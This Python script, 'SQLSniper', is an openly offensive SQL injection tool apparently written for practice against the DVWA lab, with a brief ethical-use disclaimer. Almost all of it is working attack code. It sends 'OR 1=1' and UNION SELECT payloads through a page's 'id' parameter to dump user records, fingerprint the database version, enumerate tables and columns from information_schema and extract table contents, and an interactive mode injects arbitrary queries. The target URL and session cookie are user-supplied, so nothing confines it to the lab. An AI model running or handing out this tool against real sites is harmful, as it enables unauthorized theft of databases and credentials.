#!/usr/bin/env python3
# SQLSniper - Advanced SQL Injection Tool
# By koreyhacks_
#
# DISCLAIMER: This tool is intended for ethical hacking practice only.
# Always obtain proper authorization before testing any system or application.

import requests
import re
import argparse
import sys
import time
from bs4 import BeautifulSoup
from colorama import init, Fore, Style, Back

# Initialize colorama
init()

# Color codes
PURPLE = Fore.MAGENTA
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

def print_banner():
    """Display SQLSniper banner with improved sniper rifle ASCII art"""
    # Clear screen
    print("\033c", end="")
    
    # Keep the great title design
    print(f"\n\n")
    print(f"{BOLD}{PURPLE}  ███████╗ ██████╗ ██╗         {RED}███████╗███╗   ██╗██╗██████╗ ███████╗██████╗ {RESET}")
    print(f"{BOLD}{PURPLE}  ██╔════╝██╔═══██╗██║         {RED}██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗{RESET}")
    print(f"{BOLD}{PURPLE}  ███████╗██║   ██║██║         {RED}███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝{RESET}")
    print(f"{BOLD}{PURPLE}  ╚════██║██║▄▄ ██║██║         {RED}╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗{RESET}")
    print(f"{BOLD}{PURPLE}  ███████║╚██████╔╝███████╗    {RED}███████║██║ ╚████║██║██║     ███████╗██║  ██║{RESET}")
    print(f"{BOLD}{PURPLE}  ╚══════╝ ╚══▀▀═╝ ╚══════╝    {RED}╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{RESET}")
    
    # Improved sniper rifle ASCII art with better definition
    print(f"\n")
    print(f"{CYAN}                                ╭────────────╮{RESET}")
    print(f"{CYAN}                                │ ╭──╮ ╭───╮ │{RESET}")
    print(f"{RED}   ╭───────╮   ╭────────────────┤ │  │ │   │ ├─┬─────────────────────╮{RESET}")
    print(f"{RED}   │       │ ╭─┤    {PURPLE}=========================================================={CYAN}─╯{RESET}")
    print(f"{RED}   │  ╭────┴─┴╮└────────────────┤ │  │ │   │ ├─┬─────────────────────╯{RESET}")
    print(f"{RED}   │  │       │                 │ ╰──╯ ╰───╯ │{RESET}")
    print(f"{RED}   │  │       │                 ╰────────────╯{RESET}")
    print(f"{RED}   │  │       │{RESET}")
    print(f"{RED}   │  │  ╭────┘{RESET}")
    print(f"{RED}   ╰──┴──╯{RESET}")
    
    print(f"\n{YELLOW}                           By koreyhacks_{RESET}")
    print(f"{CYAN}{'═' * 75}{RESET}\n")
    print(f"{YELLOW}            Precision SQL Injection - Target, Aim, Execute{RESET}\n")

def animate_loading():
    """Display a simple loading animation"""
    animation = "⣾⣽⣻⢿⡿⣟⣯⣷"
    for i in range(10):
        sys.stdout.write(f"\r{CYAN}[{animation[i % len(animation)]}] Preparing attack vectors...{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f"\r{GREEN}[✓] Attack vectors prepared!{' ' * 20}\n{RESET}")

def extract_query_results(response_text):
    """Extract query results from HTML response"""
    try:
        # Use BeautifulSoup to parse the HTML
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Find the vulnerable_code_area div where results are displayed
        vulnerable_area = soup.find('div', class_='vulnerable_code_area')
        if not vulnerable_area:
            return None
            
        # Look for <pre> tags that might contain SQL results
        pre_tags = vulnerable_area.find_all('pre')
        if pre_tags:
            results = [pre.text for pre in pre_tags]
            return results
            
        # If no pre tags, try to extract direct text with regex
        # Pattern for DVWA SQL Injection results (ID, first name, surname)
        pattern = r"ID: .*?\nFirst name: .*?\nSurname: .*?"
        matches = re.findall(pattern, vulnerable_area.text)
        if matches:
            return matches
            
        # Return raw text as fallback
        return [vulnerable_area.text.strip()]
    except Exception as e:
        print(f"{RED}Error parsing response: {str(e)}{RESET}")
        return None

def extract_database_info(session, base_url, cookies, query):
    """Execute a SQL query and extract results"""
    try:
        # Create payload URL
        payload = f"{base_url}&id={query}&Submit=Submit"
        
        # Send request
        response = session.get(payload, cookies=cookies)
        
        # Check if successful
        if response.status_code == 200:
            results = extract_query_results(response.text)
            return results
        else:
            print(f"{RED}Error: HTTP Status {response.status_code}{RESET}")
            return None
    except Exception as e:
        print(f"{RED}Error executing query: {str(e)}{RESET}")
        return None

def dump_all_users(session, base_url, cookies):
    """Dump all users from the database"""
    print(f"{CYAN}[*] Taking aim at user database...{RESET}")
    animate_loading()
    
    # Use UNION query to dump user data
    query = "1' OR '1'='1"
    results = extract_database_info(session, base_url, cookies, query)
    
    if results:
        print(f"{GREEN}[+] {Fore.WHITE}Target hit! Found {len(results)} users:{RESET}")
        for i, result in enumerate(results):
            print(f"{YELLOW}User {i+1}:{RESET}\n{result}\n")
        return True
    else:
        print(f"{RED}[-] Shot missed. Failed to extract users{RESET}")
        return False

def get_db_version(session, base_url, cookies):
    """Get database version"""
    print(f"{CYAN}[*] Scanning target environment...{RESET}")
    animate_loading()
    
    # Different payloads for different DB systems
    payloads = [
        "0' UNION SELECT 1,@@version,3 -- -",  # MySQL/MariaDB
        "0' UNION SELECT 1,version(),3 -- -",   # PostgreSQL
        "0' UNION SELECT 1,sqlite_version(),3 -- -"  # SQLite
    ]
    
    for payload in payloads:
        print(f"{CYAN}[*] Calibrating scope: {payload}{RESET}")
        results = extract_database_info(session, base_url, cookies, payload)
        
        if results and any("version" in str(r).lower() for r in results):
            print(f"{GREEN}[+] {Fore.WHITE}Direct hit! Database identified:{RESET}")
            for result in results:
                print(f"{YELLOW}{result}{RESET}")
            return True
    
    print(f"{RED}[-] Target obscured. Failed to identify database{RESET}")
    return False

def get_table_names(session, base_url, cookies):
    """Get table names from database"""
    print(f"{CYAN}[*] Mapping target structure...{RESET}")
    animate_loading()
    
    # UNION query to extract table names from information_schema
    query = "0' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -"
    results = extract_database_info(session, base_url, cookies, query)
    
    if results:
        print(f"{GREEN}[+] {Fore.WHITE}Structural analysis complete! Tables found:{RESET}")
        for result in results:
            print(f"{YELLOW}{result}{RESET}")
        return True
    else:
        print(f"{RED}[-] Recon failed. Could not identify tables{RESET}")
        return False

def get_column_names(session, base_url, cookies, table_name):
    """Get column names for a specific table"""
    print(f"{CYAN}[*] Analyzing table structure: {table_name}{RESET}")
    animate_loading()
    
    # UNION query to extract column names from information_schema
    query = f"0' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='{table_name}' -- -"
    results = extract_database_info(session, base_url, cookies, query)
    
    if results:
        print(f"{GREEN}[+] {Fore.WHITE}Target components identified! Columns in {table_name}:{RESET}")
        for result in results:
            print(f"{YELLOW}{result}{RESET}")
        return True
    else:
        print(f"{RED}[-] Structural analysis failed for table {table_name}{RESET}")
        return False

def dump_table_data(session, base_url, cookies, table_name, columns):
    """Dump data from a specific table"""
    print(f"{CYAN}[*] Extracting data from: {table_name}{RESET}")
    animate_loading()
    
    # Format columns for CONCAT
    column_str = ",0x3A,".join(columns)  # 0x3A is a colon
    
    # UNION query to extract data
    query = f"0' UNION SELECT 1,CONCAT({column_str}),3 FROM {table_name} -- -"
    results = extract_database_info(session, base_url, cookies, query)
    
    if results:
        print(f"{GREEN}[+] {Fore.WHITE}Extraction successful! Data from {table_name}:{RESET}")
        for result in results:
            print(f"{YELLOW}{result}{RESET}")
        return True
    else:
        print(f"{RED}[-] Data extraction failed from table {table_name}{RESET}")
        return False

def interactive_mode(session, base_url, cookies):
    """Interactive mode for custom SQL queries"""
    print(f"{CYAN}[*] Entering precision targeting mode. Type 'exit' to abort mission.{RESET}")
    
    while True:
        custom_query = input(f"{GREEN}SQLSniper> {RESET}")
        
        if custom_query.lower() == 'exit':
            break
        
        print(f"{CYAN}[*] Taking aim with: {custom_query}{RESET}")
        animate_loading()
        results = extract_database_info(session, base_url, cookies, custom_query)
        
        if results:
            print(f"{GREEN}[+] {Fore.WHITE}Target hit! Results:{RESET}")
            for result in results:
                print(f"{YELLOW}{result}{RESET}")
        else:
            print(f"{RED}[-] Shot missed. No results returned{RESET}")

def main():
    parser = argparse.ArgumentParser(description="SQLSniper - Precision SQL Injection")
    parser.add_argument("-u", "--url", required=True, help="Base URL of vulnerable SQL injection page (without parameters)")
    parser.add_argument("-c", "--cookie", required=True, help="Session cookie (format: PHPSESSID=value;security=low)")
    parser.add_argument("-m", "--mode", choices=["users", "version", "tables", "columns", "data", "interactive"], 
                        default="users", help="Attack mode")
    parser.add_argument("-t", "--table", help="Target table name for column or data modes")
    parser.add_argument("-cols", "--columns", help="Comma-separated list of columns for data mode")
    
    args = parser.parse_args()
    
    # Parse cookies
    cookie_dict = {}
    for cookie in args.cookie.split(';'):
        if '=' in cookie:
            name, value = cookie.split('=', 1)
            cookie_dict[name.strip()] = value.strip()
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    # Ensure URL is correctly formatted
    base_url = args.url
    if '?' not in base_url:
        base_url += '?'
    if not base_url.endswith('?') and not base_url.endswith('&'):
        base_url += '&'
    
    print_banner()
    
    # Execute based on mode
    if args.mode == "users":
        dump_all_users(session, base_url, cookie_dict)
    elif args.mode == "version":
        get_db_version(session, base_url, cookie_dict)
    elif args.mode == "tables":
        get_table_names(session, base_url, cookie_dict)
    elif args.mode == "columns":
        if not args.table:
            print(f"{RED}Error: Target table name required for columns mode{RESET}")
            sys.exit(1)
        get_column_names(session, base_url, cookie_dict, args.table)
    elif args.mode == "data":
        if not args.table or not args.columns:
            print(f"{RED}Error: Target table name and columns required for data mode{RESET}")
            sys.exit(1)
        columns = [col.strip() for col in args.columns.split(',')]
        dump_table_data(session, base_url, cookie_dict, args.table, columns)
    elif args.mode == "interactive":
        interactive_mode(session, base_url, cookie_dict)

if __name__ == "__main__":
    main()
